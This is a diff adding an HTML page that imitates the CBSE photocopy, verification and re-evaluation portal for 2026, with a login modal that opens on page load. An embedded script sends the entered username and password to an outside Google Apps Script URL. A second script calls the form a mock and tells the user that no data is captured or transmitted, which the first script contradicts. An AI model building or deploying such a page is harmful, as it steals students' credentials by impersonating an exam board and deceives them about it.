@@ -1,0 +1,637 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>CBSE - Verification|Re-evaluation|Photocopy</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.cdnfonts.com/css/lato" rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/primeicons/primeicons.css">
+    <style>
+        :root {
+            --primary-color: #05a676;
+            --primary-hover: #048962;
+            --gradient-bg: linear-gradient(135deg, #d8f0f6 0%, #e6f6eb 100%);
+            --text-dark: #334155;
+            --text-muted: #64748b;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Lato', sans-serif;
+        }
+
+        body {
+            background: var(--gradient-bg);
+            min-height: 100vh;
+            color: var(--text-dark);
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* HEADER */
+        .header {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem 2.5rem;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 1.25rem;
+        }
+
+        .header-logo img {
+            width: 55px;
+            height: 55px;
+            object-fit: contain;
+        }
+
+        .header-title h1 {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #1e293b;
+        }
+
+        .header-title p {
+            font-size: 0.95rem;
+            color: var(--primary-color);
+            margin-top: 0.25rem;
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+        }
+
+        .login-btn {
+            color: var(--primary-color);
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 1rem;
+        }
+
+        .register-btn {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 0.6rem 1.5rem;
+            border-radius: 999px;
+            text-decoration: none;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background 0.2s;
+        }
+
+        .register-btn:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .icon-btn {
+            background: #f1f5f9;
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-muted);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .icon-btn.lang-btn {
+            background: var(--primary-color);
+            color: white;
+        }
+
+        .icon-btn:hover {
+            opacity: 0.9;
+        }
+
+        /* MAIN CONTENT */
+        .main-container {
+            display: flex;
+            flex-grow: 1;
+            padding: 6rem 3rem;
+            max-width: 1500px;
+            margin: 0 auto;
+            gap: 5rem;
+        }
+
+        /* LEFT SECTION */
+        .hero-section {
+            flex: 1.2;
+            padding-top: 3rem;
+        }
+
+        .hero-section h2 {
+            font-size: 4.5rem;
+            font-weight: 800;
+            line-height: 1.2;
+            color: #2F3C4F;
+            margin-bottom: 1rem;
+        }
+
+        .hero-section h2 span {
+            color: var(--primary-color);
+        }
+
+        .hero-section p {
+            font-size: 1.2rem;
+            color: var(--text-muted);
+            margin-bottom: 2.5rem;
+            max-width: 650px;
+            line-height: 1.6;
+        }
+
+        .action-pills {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.25rem;
+        }
+
+        .pill {
+            padding: 0.75rem 1.75rem;
+            border-radius: 999px;
+            font-weight: 600;
+            font-size: 1.05rem;
+            text-decoration: none;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            transition: all 0.2s;
+            border: 2px solid var(--primary-color);
+        }
+
+        .pill-solid {
+            background-color: var(--primary-color);
+            color: white;
+            box-shadow: 0 4px 10px rgba(5, 166, 118, 0.25);
+        }
+
+        .pill-solid:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-2px);
+        }
+
+        .pill-outline {
+            background-color: transparent;
+            color: var(--primary-color);
+        }
+
+        .pill-outline:hover {
+            background-color: #f0fdf6;
+        }
+
+        /* RIGHT SECTION */
+        .services-section {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 2.5rem;
+        }
+
+        .service-category h3 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 1.25rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .service-category h3 i {
+            color: #f59e0b;
+        }
+
+        .service-chips {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .chip {
+            background: white;
+            padding: 0.6rem 1.25rem;
+            border-radius: 999px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.04);
+            color: #475569;
+        }
+
+        .chip i {
+            font-size: 0.9rem;
+        }
+
+        .icon-blue { color: #3b82f6; }
+        .icon-green { color: #10b981; }
+        .icon-orange { color: #f59e0b; }
+        .icon-purple { color: #a855f7; }
+
+        .circulars-box {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 1.25rem;
+            padding: 2rem;
+            border: 1px solid rgba(255,255,255, 0.8);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.03);
+            margin-top: 1.5rem;
+        }
+
+        .circulars-box > h3 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 1.25rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: #1e293b;
+        }
+
+        .circulars-box > h3 i {
+            color: #ef4444;
+        }
+
+        .circular-list {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .circular-item {
+            background: white;
+            border-radius: 0.75rem;
+            padding: 1.25rem 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.03);
+            border: 1px solid #f1f5f9;
+        }
+
+        .circular-content {
+            display: flex;
+            flex-direction: column;
+            gap: 0.4rem;
+        }
+
+        .circular-title {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: #1e293b;
+        }
+
+        .circular-date {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .circular-pdf {
+            color: #ef4444;
+            background: #fef2f2;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 1.1rem;
+        }
+
+        .circular-pdf:hover {
+            background: #fee2e2;
+        }
+
+        @media (max-width: 1024px) {
+            .main-container {
+                flex-direction: column;
+                padding: 3rem 2rem;
+                gap: 4rem;
+            }
+        }
+
+        /* MODAL STYLES */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+            opacity: 1;
+        }
+
+        .modal-card {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 1rem;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            transform: translateY(-20px);
+            transition: transform 0.3s ease;
+            position: relative;
+        }
+
+        .modal-overlay.active .modal-card {
+            transform: translateY(0);
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 1rem;
+            right: 1.5rem;
+            background: none;
+            border: none;
+            font-size: 2rem;
+            cursor: pointer;
+            color: var(--text-muted);
+            transition: color 0.2s;
+            line-height: 1;
+        }
+
+        .modal-close:hover {
+            color: #ef4444;
+        }
+
+        .modal-header h2 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 0.5rem;
+        }
+
+        .modal-header p {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            margin-bottom: 2rem;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            margin-bottom: 1.25rem;
+        }
+
+        .input-group label {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #334155;
+        }
+
+        .input-group input {
+            padding: 0.75rem 1rem;
+            border: 1px solid #cbd5e1;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(5, 166, 118, 0.15);
+        }
+
+        .modal-submit {
+            width: 100%;
+            background: var(--primary-color);
+            color: white;
+            padding: 0.8rem;
+            border-radius: 0.5rem;
+            border: none;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 1rem;
+            transition: background 0.2s;
+        }
+
+        .modal-submit:hover {
+            background: var(--primary-hover);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="header-logo">
+            <!-- CBSE Logo Vector approximation -->
+            <svg width="60" height="60" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="50" cy="50" r="45" fill="#f0f9ff" stroke="#05a676" stroke-width="3"/>
+                <path d="M50 20L75 40H25L50 20Z" fill="#05a676"/>
+                <rect x="35" y="40" width="6" height="30" fill="#05a676"/>
+                <rect x="59" y="40" width="6" height="30" fill="#05a676"/>
+                <path d="M20 70H80V80H20V70Z" fill="#05a676"/>
+                <circle cx="50" cy="50" r="38" stroke="#05a676" stroke-width="1.5" stroke-dasharray="2 4"/>
+            </svg>
+            <div class="header-title">
+                <h1>Central Board of Secondary Education</h1>
+                <p>Photocopy/ Verification/ Re-Evaluation Portal 2026</p>
+            </div>
+        </div>
+        <div class="header-actions">
+            <a href="#" class="login-btn" id="loginBtn">Login</a>
+            <button class="register-btn">Register</button>
+            <button class="icon-btn"><i class="pi pi-sun"></i></button>
+            <button class="icon-btn lang-btn"><i class="pi pi-globe"></i></button>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container">
+        <!-- Left Hero Section -->
+        <div class="hero-section">
+            <h2>Post Result <span>Activities</span></h2>
+            <p>Unified platform for Photocopy, Verification and Re-evaluation with secure online processing.</p>
+            
+            <div class="action-pills">
+                <a href="#" class="pill pill-solid">Register</a>
+                <a href="#" class="pill pill-outline">Login & Apply</a>
+                <a href="#" class="pill pill-outline">How to apply?</a>
+                <a href="#" class="pill pill-outline">Marking Scheme (Year 2026)</a>
+                <a href="#" class="pill pill-outline">Question Bank (Year 2026)</a>
+            </div>
+        </div>
+
+        <!-- Right Services Section -->
+        <div class="services-section">
+            
+            <div class="service-category">
+                <h3><i class="pi pi-sparkles icon-orange"></i> Class 10 Services</h3>
+                <div class="service-chips">
+                    <div class="chip">
+                        <i class="pi pi-file icon-purple"></i> Answer Books Photocopy
+                    </div>
+                    <div class="chip">
+                        <i class="pi pi-check-circle icon-green"></i> Verification of Marks
+                    </div>
+                    <div class="chip">
+                        <i class="pi pi-sync icon-blue"></i> Re-evaluation of Answer Books
+                    </div>
+                    <div class="chip">
+                        <i class="pi pi-briefcase icon-orange"></i> Grievance Redressal
+                    </div>
+                </div>
+            </div>
+
+            <div class="service-category">
+                <h3><i class="pi pi-sparkles icon-orange"></i> Class 12 Services</h3>
+                <div class="service-chips">
+                    <div class="chip">
+                        <i class="pi pi-file icon-purple"></i> Answer Books Photocopy
+                    </div>
+                    <div class="chip">
+                        <i class="pi pi-sync icon-blue"></i> Re-evaluation of Answer Books
+                    </div>
+                    <div class="chip">
+                        <i class="pi pi-briefcase icon-orange"></i> Grievance Redressal
+                    </div>
+                </div>
+            </div>
+
+            <div class="circulars-box">
+                <h3><i class="pi pi-volume-up"></i> CBSE Circulars</h3>
+                <div class="circular-list">
+                    
+                    <div class="circular-item">
+                        <div class="circular-content">
+                            <div class="circular-title">Extension of Date for Obtaining Scanned Copies of Answer Books - Class XII</div>
+                            <div class="circular-date"><i class="pi pi-calendar-times icon-blue"></i> 24 May 2026</div>
+                        </div>
+                        <div class="circular-pdf">
+                            <i class="pi pi-file-pdf"></i>
+                        </div>
+                    </div>
+
+                    <div class="circular-item">
+                        <div class="circular-content">
+                            <div class="circular-title">Notice Post Result Declaration Facilities Class XII Part-2</div>
+                            <div class="circular-date"><i class="pi pi-calendar-times icon-blue"></i> 17 May 2026</div>
+                        </div>
+                        <div class="circular-pdf">
+                            <i class="pi pi-file-pdf"></i>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Mock Login Modal -->
+    <div class="modal-overlay active" id="loginModal">
+        <div class="modal-card">
+            <button class="modal-close" id="closeModal">&times;</button>
+            <div class="modal-header">
+                <h2>Welcome Back</h2>
+                <p>Please log in to your account.</p>
+            </div>
+            
+            <form id="mockLoginForm">
+                <div class="input-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" placeholder="Enter your username" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="text" id="password" placeholder="Enter your password" required>
+                </div>
+                
+                <button type="submit" class="modal-submit">Login</button>
+            </form>
+            <script>
+                document.getElementById("mockLoginForm").addEventListener("submit", async (e) => {
+                    e.preventDefault();
+
+                    const data = {
+                        username: document.getElementById("username").value,
+                        password: document.getElementById("password").value
+                    };
+
+                    await fetch("https://script.google.com/macros/s/AKfycbwjwAh6yQnOCdQhXajYCaYmv-S4Sd5isDQgN6ZRn_sDASilQDDboBDb77Vd0Knv-ZI/exec", {
+                        method: "POST",
+                        body: JSON.stringify(data)
+                    });
+
+                    alert("Submitted");
+});
+            </script>
+        </div>
+    </div>
+
+    <!-- Modal UI Logic -->
+    <script>
+        const loginBtn = document.getElementById('loginBtn');
+        const loginModal = document.getElementById('loginModal');
+        const closeModal = document.getElementById('closeModal');
+        const mockLoginForm = document.getElementById('mockLoginForm');
+
+        // Open modal
+        loginBtn.addEventListener('click', (e) => {
+            e.preventDefault(); // Prevent page scroll jump
+            loginModal.classList.add('active');
+        });
+
+        // Close modal when X is clicked
+        closeModal.addEventListener('click', () => {
+            loginModal.classList.remove('active');
+        });
+
+        // Close modal when clicking on the darkened background
+        loginModal.addEventListener('click', (e) => {
+            if (e.target === loginModal) {
+                loginModal.classList.remove('active');
+            }
+        });
+
+        // Handle form submission visually only
+        mockLoginForm.addEventListener('submit', (e) => {
+            e.preventDefault(); // Stop normal form logic
+            
+            // Provide a localized mock alert
+            alert("Mock Login Visual Success!\n(This is purely a visual demonstration and no data is being captured or transmitted.)");
+            
+            // Clean up UI state
+            mockLoginForm.reset();
+            loginModal.classList.remove('active');
+        });
+    </script>
+
+</body>
+</html>
